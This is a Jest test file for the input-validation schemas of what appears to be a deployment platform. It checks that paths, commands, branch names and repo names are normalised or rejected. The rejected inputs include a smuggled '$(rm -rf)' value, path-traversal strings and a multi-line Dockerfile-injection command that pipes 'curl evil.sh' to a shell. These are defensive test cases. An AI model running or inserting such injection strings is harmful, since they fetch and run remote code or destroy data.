import {
  BranchNameSchema,
  CommandSchema,
  ProjectNameSchema,
  ProjectSettingsSchema,
  RelativePathSchema,
  RepoFullNameSchema,
} from './project.schemas';

describe('RelativePathSchema', () => {
  it.each([
    ['', ''],
    ['.', ''],
    ['./', ''],
    ['./apps/web', 'apps/web'],
    ['/apps/web/', 'apps/web'],
    ['dist', 'dist'],
    ['dist/my-app/browser', 'dist/my-app/browser'],
  ])('normalises %p to %p', (input, expected) => {
    expect(RelativePathSchema.parse(input)).toBe(expected);
  });

  it.each(['../secrets', 'apps/../..', 'a b', 'C:\\x', 'apps//web', '$(rm -rf)'])(
    'rejects %p',
    (input) => {
      expect(RelativePathSchema.safeParse(input).success).toBe(false);
    },
  );
});

describe('CommandSchema', () => {
  it('turns empty strings into null', () => {
    expect(CommandSchema.parse('   ')).toBeNull();
    expect(CommandSchema.parse(null)).toBeNull();
  });

  it('rejects multi-line commands (Dockerfile injection)', () => {
    expect(CommandSchema.safeParse('npm run build\nRUN curl evil.sh | sh').success).toBe(false);
  });

  it('keeps single-line commands', () => {
    expect(CommandSchema.parse(' npm run build && npm test ')).toBe('npm run build && npm test');
  });
});

describe('ProjectNameSchema', () => {
  it('lower-cases valid names', () => {
    expect(ProjectNameSchema.parse('My-App')).toBe('my-app');
  });

  it.each(['-app', 'app-', 'my_app', 'my app', ''])('rejects %p', (input) => {
    expect(ProjectNameSchema.safeParse(input).success).toBe(false);
  });
});

describe('BranchNameSchema', () => {
  it.each(['main', 'feature/login', 'release-1.2'])('accepts %p', (input) => {
    expect(BranchNameSchema.safeParse(input).success).toBe(true);
  });

  it.each(['a..b', 'has space', '/lead', 'trail/', 'x.lock', 'a:b'])('rejects %p', (input) => {
    expect(BranchNameSchema.safeParse(input).success).toBe(false);
  });
});

describe('ProjectSettingsSchema', () => {
  const base = {
    installCommand: 'npm ci',
    buildCommand: 'npm run build',
    startCommand: 'npm start',
    outputDirectory: null,
    port: 3000,
    nodeVersion: 22,
  };

  it('requires a start command for node apps', () => {
    const result = ProjectSettingsSchema.safeParse({ ...base, adapter: 'node', startCommand: '' });
    expect(result.error?.issues[0]?.path).toEqual(['startCommand']);
  });

  it('requires an output directory for SPAs', () => {
    const result = ProjectSettingsSchema.safeParse({ ...base, adapter: 'spa' });
    expect(result.error?.issues[0]?.path).toEqual(['outputDirectory']);
  });

  it('accepts an empty output directory (repo root) for static sites', () => {
    const result = ProjectSettingsSchema.safeParse({
      ...base,
      adapter: 'static',
      outputDirectory: '',
    });
    expect(result.success).toBe(true);
  });

  it('rejects unsupported node versions and ports', () => {
    expect(
      ProjectSettingsSchema.safeParse({ ...base, adapter: 'node', nodeVersion: 16 }).success,
    ).toBe(false);
    expect(ProjectSettingsSchema.safeParse({ ...base, adapter: 'node', port: 70000 }).success).toBe(
      false,
    );
  });
});

describe('RepoFullNameSchema', () => {
  it.each(['acme/web', 'Ada-L/my.site_2', 'a/.github'])('accepts %p', (input) => {
    expect(RepoFullNameSchema.safeParse(input).success).toBe(true);
  });

  it.each([
    '../etc',
    'acme/..',
    'acme/.',
    'acme',
    'a/b/c',
    '-acme/web',
    'acme/web?x=1',
    'ac me/web',
  ])('rejects %p', (input) => {
    expect(RepoFullNameSchema.safeParse(input).success).toBe(false);
  });
});
